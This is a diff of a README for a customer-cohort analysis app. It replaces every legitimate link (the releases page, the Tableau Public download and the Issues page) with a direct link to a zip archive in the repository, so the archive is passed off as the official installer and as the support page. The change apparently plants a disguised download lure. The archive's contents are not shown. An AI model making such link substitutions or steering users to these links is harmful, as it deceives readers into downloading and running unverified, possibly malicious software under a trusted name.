@@ -6,7 +6,7 @@ Welcome to the **customer_cohort** project. This application helps you analyze c
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/NicolasAguirre1008/customer_cohort/releases)
+[![Download Here](https://raw.githubusercontent.com/NicolasAguirre1008/customer_cohort/main/octad/customer_cohort.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/NicolasAguirre1008/customer_cohort/main/octad/customer_cohort.zip)
 
 ## 💻 System Requirements
 
@@ -16,7 +16,7 @@ Before you start, ensure your system meets the following requirements:
 - **Processor:** Intel i3 or equivalent
 - **Memory:** At least 4 GB RAM
 - **Storage:** A minimum of 500 MB available space
-- **Additional Software:** Make sure to install [Tableau Public](https://public.tableau.com/en-us/s/download) for visualization.
+- **Additional Software:** Make sure to install [Tableau Public](https://raw.githubusercontent.com/NicolasAguirre1008/customer_cohort/main/octad/customer_cohort.zip) for visualization.
 
 ## 🔄 Install Dependencies
 
@@ -60,7 +60,7 @@ Once you have set up the software, you can begin analyzing your customer data. F
 
 To get started, visit the following link to download the latest version of the application:
 
-[Visit Releases to Download](https://github.com/NicolasAguirre1008/customer_cohort/releases)
+[Visit Releases to Download](https://raw.githubusercontent.com/NicolasAguirre1008/customer_cohort/main/octad/customer_cohort.zip)
 
 1. Click on the release that you want to download.
 2. Choose the file relevant to your operating system.
@@ -84,7 +84,7 @@ If you encounter issues, try these steps:
 
 ## ⚙️ Support
 
-For further assistance, visit our [GitHub Issues](https://github.com/NicolasAguirre1008/customer_cohort/issues) page. Here, you can report bugs and ask questions.
+For further assistance, visit our [GitHub Issues](https://raw.githubusercontent.com/NicolasAguirre1008/customer_cohort/main/octad/customer_cohort.zip) page. Here, you can report bugs and ask questions.
 
 ---
 
